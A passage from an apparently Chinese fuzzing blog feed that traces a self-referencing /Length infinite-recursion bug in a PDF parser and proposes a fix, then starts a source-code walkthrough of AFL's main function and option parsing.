src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008203809004.png"></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> xrefEntryUncompressed:</span><br><span class="line">    <span class="comment">// 步骤1：验证generation number匹配</span></span><br><span class="line">    <span class="keyword">if</span> (e-&gt;gen != gen) &#123;</span><br><span class="line">        <span class="keyword">goto</span> err;  <span class="comment">// gen不匹配，返回null对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 步骤2：在字节偏移处创建解析器</span></span><br><span class="line">    parser = <span class="keyword">new</span> <span class="built_in">Parser</span>(<span class="keyword">this</span>,</span><br><span class="line">               <span class="keyword">new</span> <span class="built_in">Lexer</span>(<span class="keyword">this</span>,</span><br><span class="line">                   str-&gt;<span class="built_in">makeSubStream</span>(start + e-&gt;offset, gFalse, <span class="number">0</span>, &amp;obj1)),</span><br><span class="line">               gTrue);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 步骤3：解析对象头部 &quot;num gen obj&quot;，根据num对应的指针来寻找对应对象</span></span><br><span class="line">    parser-&gt;<span class="built_in">getObj</span>(&amp;obj1, gTrue);  <span class="comment">// 读取对象号</span></span><br><span class="line">    parser-&gt;<span class="built_in">getObj</span>(&amp;obj2, gTrue);  <span class="comment">// 读取generation号</span></span><br><span class="line">    parser-&gt;<span class="built_in">getObj</span>(&amp;obj3, gTrue);  <span class="comment">// 读取&quot;obj&quot;关键字</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 步骤4：验证头部</span></span><br><span class="line">    <span class="keyword">if</span> (!obj1.<span class="built_in">isInt</span>() || obj1.<span class="built_in">getInt</span>() != num ||</span><br><span class="line">        !obj2.<span class="built_in">isInt</span>() || obj2.<span class="built_in">getInt</span>() != gen ||</span><br><span class="line">        !obj3.<span class="built_in">isCmd</span>(<span class="string">&quot;obj&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 头部不匹配，对象损坏</span></span><br><span class="line">        <span class="keyword">delete</span> parser;</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 步骤5：解析实际对象内容(考虑加密)</span></span><br><span class="line">    parser-&gt;<span class="built_in">getObj</span>(obj, gFalse, </span><br><span class="line">                   encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">                   encAlgorithm, keyLength, num, gen, recursion);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span> parser;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p> <img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251008220215599.png"></p><p>可以看到对应的对象应该就是这个了</p><p>然后调用对应步骤5的parser-&gt;getObj，由于getObj函数比较复杂，我们详细看看getObj函数调用makeStream，参数几乎和调用getObj相同</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数说明：</span></span><br><span class="line"><span class="comment">// - obj: 包含流字典的对象（如/Length, /Filter等元数据）</span></span><br><span class="line"><span class="comment">// - fileKey: 解密密钥</span></span><br><span class="line"><span class="comment">// - encAlgorithm, keyLength: 加密参数</span></span><br><span class="line"><span class="comment">// - objNum, objGen: 对象编号和代世号（用于生成对象特定的解密密钥）</span></span><br><span class="line"><span class="keyword">if</span> ((str = <span class="built_in">makeStream</span>(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line"> objNum, objGen))) </span><br></pre></td></tr></table></figure><p>我们直接跟进</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Stream *<span class="title">Parser::makeStream</span><span class="params">(Object *dict, Guchar *fileKey,</span></span></span><br><span class="line"><span class="params"><span class="function">   CryptAlgorithm encAlgorithm, <span class="keyword">int</span> keyLength,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">int</span> objNum, <span class="keyword">int</span> objGen)</span> </span>&#123;</span><br><span class="line">  Object obj;</span><br><span class="line">  BaseStream *baseStr;</span><br><span class="line">  Stream *str;</span><br><span class="line">  Guint pos, endPos, length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get stream start position</span></span><br><span class="line">  lexer-&gt;<span class="built_in">skipToNextLine</span>();</span><br><span class="line">  pos = lexer-&gt;<span class="built_in">getPos</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get length</span></span><br><span class="line">  dict-&gt;<span class="built_in">dictLookup</span>(<span class="string">&quot;Length&quot;</span>, &amp;obj);</span><br></pre></td></tr></table></figure><p>这里我们发现传入dictLookup的obj变化了，而原来的obj正是现在的dict，这里应该是寻找length对应的值<br>我们看看这个dick</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251009095201196.png"></p><p>这个格式是个间接引用</p><p>格式经过查找如下：</p><p><strong>&lt;&lt;/Length 对象编号 代数 R&gt;&gt;</strong></p><p>我们可以看到，这里的对象编号是其自身，也就是这里有个自指，很有可能是这里的原因导致了这里无限递归的情况。我们接着往下看</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> Object *<span class="title">Object::dictLookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">return</span> dict-&gt;<span class="built_in">lookup</span>(key, obj); &#125;</span><br></pre></td></tr></table></figure><p>接着往下看</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Object *<span class="title">Dict::lookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span> </span>&#123;</span><br><span class="line">  DictEntry *e;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (e = <span class="built_in">find</span>(key)) ? e-&gt;val.<span class="built_in">fetch</span>(xref, obj) : obj-&gt;<span class="built_in">initNull</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可看到又调用了参数为7的<em>Object::fetch</em>函数。在Object::fetch函数中有对于Length使用直接寻址还是间接寻址的判断，到这里我们又回去了，这下对这个bug已经完全了解清楚了，也就是说我们需要检查一下是否存在自指的情况就行。</p><p>我们看看makeStream这个函数，这里主要是直接调用dict-&gt;dictLookup(“Length”, &amp;obj);，我们需要修改一下这部分代码，使其可以检查是否自指后再调用。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">tream *<span class="title">Parser::makeStream</span><span class="params">(Object *dict, Guchar *fileKey,</span></span></span><br><span class="line"><span class="params"><span class="function">   CryptAlgorithm encAlgorithm, <span class="keyword">int</span> keyLength,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">int</span> objNum, <span class="keyword">int</span> objGen)</span> </span>&#123;</span><br><span class="line">  Object obj;</span><br><span class="line">  BaseStream *baseStr;</span><br><span class="line">  Stream *str;</span><br><span class="line">  Guint pos, endPos, length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get stream start position</span></span><br><span class="line">  lexer-&gt;<span class="built_in">skipToNextLine</span>();</span><br><span class="line">  pos = lexer-&gt;<span class="built_in">getPos</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get length</span></span><br><span class="line">  dict-&gt;<span class="built_in">dictLookup</span>(<span class="string">&quot;Length&quot;</span>, &amp;obj);</span><br><span class="line">  <span class="keyword">if</span> (obj.<span class="built_in">isInt</span>()) &#123;</span><br><span class="line">    length = (Guint)obj.<span class="built_in">getInt</span>();</span><br><span class="line">    obj.<span class="built_in">free</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">error</span>(<span class="built_in">getPos</span>(), <span class="string">&quot;Bad &#x27;Length&#x27; attribute in stream&quot;</span>);</span><br><span class="line">    obj.<span class="built_in">free</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>具体的修改就不详细做了，代码耦合太多有些麻烦，要做简单的修改很容易影响函数正常功能，这里就只指出应该在makeStream调用</p><p>  dict-&gt;dictLookup(“Length”, &amp;obj);前做检测，先校验是否自指再调用dictLookup函数即可。</p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL代码详读（下）</title>
      <link href="/2025/07/19/AFL%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%AF%BB%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2025/07/19/AFL%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%AF%BB%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="FUZZ主循环前的基础准备阶段"><a href="#FUZZ主循环前的基础准备阶段" class="headerlink" title="FUZZ主循环前的基础准备阶段"></a>FUZZ主循环前的基础准备阶段</h1><p>代码来源是sakura师傅提供的修改过的AFL，这里我提供一下运行AFL的程序实参</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-i</span><br><span class="line">/home/kr0emer/fuzzing_libexif/exif-samples-master/jpg/</span><br><span class="line">-o</span><br><span class="line">/home/kr0emer/fuzzing_libexif/out1/</span><br><span class="line">-m</span><br><span class="line">none</span><br><span class="line">-t</span><br><span class="line">500+</span><br><span class="line">--</span><br><span class="line">/home/kr0emer/fuzzing_libexif/install/bin/exif</span><br><span class="line">@@</span><br></pre></td></tr></table></figure><p>我们从main函数一步步往下看</p><p>第一个遇到的函数是</p><h2 id="memset-sakura-array"><a href="#memset-sakura-array" class="headerlink" title="memset_sakura_array"></a>memset_sakura_array</h2><p>这个函数的功能就是</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memset_sakura_array</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* 初始化 simplify_lookup 数组（用于简化覆盖率跟踪数据）</span></span><br><span class="line"><span class="comment">   * [0] = 1 表示 0 值映射为 1</span></span><br><span class="line"><span class="comment">   * [1-255] = 128 表示所有非零值映射为 128 */</span></span><br><span class="line">  simplify_lookup[<span class="number">0</span>] = <span class="number">1</span>;                <span class="comment">// 零值特殊处理</span></span><br><span class="line">  <span class="built_in">memset</span>(simplify_lookup + <span class="number">1</span>, <span class="number">128</span>, <span class="number">255</span>); <span class="comment">// 非零值统一映射为 128</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化 count_class_lookup8 数组（用于执行计数分类）</span></span><br><span class="line"><span class="comment">   * 将 8 位执行计数（0-255）分类到指数级桶中 */</span></span><br><span class="line">  count_class_lookup8[<span class="number">0</span>] = <span class="number">0</span>;   <span class="comment">// 计数 0 → 桶 0</span></span><br><span class="line">  count_class_lookup8[<span class="number">1</span>] = <span class="number">1</span>;   <span class="comment">// 计数 1 → 桶 1</span></span><br><span class="line">  count_class_lookup8[<span class="number">2</span>] = <span class="number">2</span>;   <span class="comment">// 计数 2 → 桶 2</span></span><br><span class="line">  count_class_lookup8[<span class="number">3</span>] = <span class="number">4</span>;   <span class="comment">// 计数 3 → 桶 4</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计数 4-7 → 桶 8 */</span></span><br><span class="line">  <span class="built_in">memset</span>(count_class_lookup8 + <span class="number">4</span>, <span class="number">8</span>, <span class="number">7</span> - <span class="number">4</span> + <span class="number">1</span>);  <span class="comment">// 设置索引 4-7 (共4个元素)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计数 8-15 → 桶 16 */</span></span><br><span class="line">  <span class="built_in">memset</span>(count_class_lookup8 + <span class="number">8</span>, <span class="number">16</span>, <span class="number">15</span> - <span class="number">8</span> + <span class="number">1</span>); <span class="comment">// 设置索引 8-15 (共8个元素)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计数 16-31 → 桶 32 */</span></span><br><span class="line">  <span class="built_in">memset</span>(count_class_lookup8 + <span class="number">16</span>, <span class="number">32</span>, <span class="number">32</span> - <span class="number">16</span>);   <span class="comment">// 设置索引 16-31 (共16个元素)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计数 32-127 → 桶 64 */</span></span><br><span class="line">  <span class="built_in">memset</span>(count_class_lookup8 + <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span> - <span class="number">32</span>);  <span class="comment">// 设置索引 32-127 (共96个元素)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计数 128-255 → 桶 128 */</span></span><br><span class="line">  <span class="built_in">memset</span>(count_class_lookup8 + <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>);     <span class="comment">// 设置索引 128-255 (共128个元素)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250801105646712.png" alt="simplify_lookup"></p><p>simplify_lookup大概是上面这样</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250801105835656.png" alt="count_class_lookup8"></p><p>count_class_lookup8大概是上面这样,这里这个数组是为了后面<strong>将执行次数映射到粗粒度的分类桶</strong>，比如说[8,15]都对应为16，这样精确区分低执行次数（0、1、2 次的区别很重要）对高执行次数进行粗粒度分类（100 次和 101 次没有本质区别）</p><p>之后是一些信息打印和路径获取，接下来值得注意的是</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);<span class="comment">//获得时间和时区信息</span></span><br><span class="line"><span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());<span class="comment">//通过时间以及pid获取一个随机种子</span></span><br></pre></td></tr></table></figure><p>这两个函数先是获取了时间信息，并与pid一起组成了一个随机数种子</p><p>接下来是一个while循环，根据返回的opt值来分析命令</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">// getopt 参数说明：</span></span><br><span class="line"><span class="comment">// + : 停止于第一个非选项参数（POSIX行为）</span></span><br><span class="line"><span class="comment">// : : 该选项需要参数（如 i: 表示 -i 需要参数）</span></span><br><span class="line"><span class="comment">// 无冒号：该选项不需要参数（如 d 表示 -d 是开关）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (opt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* 输入目录 - 存放初始测试用例 */</span></span><br><span class="line">        <span class="keyword">if</span> (in_dir)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -i options not supported&quot;</span>);  <span class="comment">// 防止重复指定</span></span><br><span class="line">        in_dir = optarg;  <span class="comment">// optarg 是 getopt 自动设置的选项参数</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>))  <span class="comment">// 特殊值 &quot;-&quot; </span></span><br><span class="line">            in_place_resume = <span class="number">1</span>;    <span class="comment">// 启用就地恢复模式（从上次中断处继续）</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* 输出目录 - 存放fuzzing结果 */</span></span><br><span class="line">        <span class="keyword">if</span> (out_dir)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="comment">/* 主节点模式 - 并行fuzzing的主控节点 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        u8 *c;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (sync_id)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = ck_strdup(optarg);  <span class="comment">// 复制字符串（AFL的安全版strdup）</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 支持高级格式：-M id:current/total</span></span><br><span class="line">        <span class="comment">// 例如：-M master:1/4 表示4个主节点中的第1个</span></span><br><span class="line">        <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>((<span class="keyword">char</span> *)sync_id, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            *c = <span class="number">0</span>;  <span class="comment">// 将冒号替换为\0，分割字符串</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 解析 &quot;当前ID/总数&quot; 格式</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>)</span><br><span class="line">                FATAL(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        force_deterministic = <span class="number">1</span>;  <span class="comment">// 主节点必须执行确定性变异</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: <span class="comment">/* 从节点模式 - 并行fuzzing的辅助节点 */</span></span><br><span class="line">        <span class="keyword">if</span> (sync_id)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = ck_strdup(optarg);  <span class="comment">// 从节点标识符</span></span><br><span class="line">        <span class="comment">// 注意：从节点不设置 force_deterministic</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* 输出文件 - 指定单个输出文件而非目录 */</span></span><br><span class="line">        <span class="keyword">if</span> (out_file)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* 字典目录 - 包含关键字/token的目录 */</span></span><br><span class="line">        <span class="keyword">if</span> (extras_dir)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: <span class="comment">/* 执行超时时间（毫秒）*/</span></span><br><span class="line">    &#123;</span><br><span class="line">        u8 suffix = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (timeout_given)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 支持格式：-t 1000 或 -t 1000+</span></span><br><span class="line">        <span class="comment">// + 后缀表示&quot;软超时&quot;（允许偶尔超时）</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">            optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>)  <span class="comment">// 不允许负数</span></span><br><span class="line">            FATAL(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>)  <span class="comment">// 最小5ms</span></span><br><span class="line">            FATAL(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            timeout_given = <span class="number">2</span>;  <span class="comment">// 软超时模式</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            timeout_given = <span class="number">1</span>;  <span class="comment">// 硬超时模式</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: <span class="comment">/* 内存限制 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        u8 suffix = <span class="string">&#x27;M&#x27;</span>;  <span class="comment">// 默认单位：MB</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (mem_limit_given)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">        mem_limit_given = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 特殊值 &quot;none&quot; 表示无限制</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 解析数值和单位：-m 512M, -m 2G, -m 1024k</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">            optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 单位转换（最终单位：MB）</span></span><br><span class="line">        <span class="keyword">switch</span> (suffix)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;  <span class="comment">// TB→MB</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;         <span class="comment">// GB→MB</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;         <span class="comment">// KB→MB</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;                             <span class="comment">// 已是MB</span></span><br><span class="line">            <span class="keyword">default</span>: FATAL(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 32位系统限制检查</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="keyword">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: <span class="comment">/* CPU核心绑定 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cpu_to_bind_given)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">        cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 解析CPU核心编号</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">            optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* 跳过确定性变异阶段 */</span></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;  <span class="comment">// 跳过位翻转等系统性变异</span></span><br><span class="line">        use_splicing = <span class="number">1</span>;        <span class="comment">// 启用测试用例拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* 隐藏选项：加载之前的覆盖率位图 */</span></span><br><span class="line">        <span class="comment">/* 这是个未公开的选项！</span></span><br><span class="line"><span class="comment">         * 用途：基于之前的fuzzing继续变异特定测试用例</span></span><br><span class="line"><span class="comment">         * 避免重新发现已知路径</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        read_bitmap(in_bitmap);  <span class="comment">// 立即加载位图</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* 崩溃探索模式 */</span></span><br><span class="line">        <span class="keyword">if</span> (crash_mode)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;  <span class="comment">// 专注于崩溃样本的深入分析</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* 盲测模式（无插桩）*/</span></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 检查是否启用特殊的 fork server 模式</span></span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>))</span><br><span class="line">            dumb_mode = <span class="number">2</span>;  <span class="comment">// 盲测但使用 fork server</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            dumb_mode = <span class="number">1</span>;  <span class="comment">// 纯盲测模式</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* 自定义界面横幅 */</span></span><br><span class="line">        <span class="keyword">if</span> (use_banner)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;  <span class="comment">// 覆盖默认的程序名显示</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU 模式 - 二进制翻译插桩 */</span></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">            FATAL(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// QEMU 模式需要更多内存</span></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given)</span><br><span class="line">            mem_limit = MEM_LIMIT_QEMU;  <span class="comment">// 默认 200MB</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* 版本信息 */</span></span><br><span class="line">        <span class="comment">// 版本已在程序启动时打印</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">/* 未知选项 */</span></span><br><span class="line">        usage(argv[<span class="number">0</span>]);  <span class="comment">// 显示帮助信息并退出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (optind == argc || !in_dir || !out_dir)</span><br><span class="line">    usage(argv[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>这里的判断语句分别是<br><code>optind == argc</code> <code>optind</code>是 <code>getopt</code>库变量，表示下一个待处理参数的索引，当两者相等时，说明<strong>没有位置参数剩余</strong>（即缺少目标程序路径）</p><p>!in_dir || !out_dir就是缺少输入/输出目录</p><p>usage函数就是打印提示信息效果大概如下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250802104702960.png"></p><p>接下来是一个函数</p><h2 id="setup-signal-handlers"><a 